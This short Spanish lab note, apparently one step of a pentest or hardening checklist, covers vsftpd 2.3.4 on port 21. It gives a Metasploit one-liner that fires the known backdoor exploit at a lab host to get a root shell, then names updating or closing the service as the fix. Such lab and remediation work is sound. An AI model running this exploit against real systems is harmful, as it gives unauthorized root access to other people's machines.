# 7. FTP (vsftpd 2.3.4, puerto 21)

## Comando
# Exploit vsftpd 2.3.4 backdoor
# msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 192.168.10.10; run; exit"

## Por qué
vsftpd 2.3.4 contiene backdoor que abre shell.

## Antes / Después
- Antes: shell root abierta al conectar.  
- Después: servicio actualizado o cerrado.

## Resultado esperado
- Shell obtenida en laboratorio.
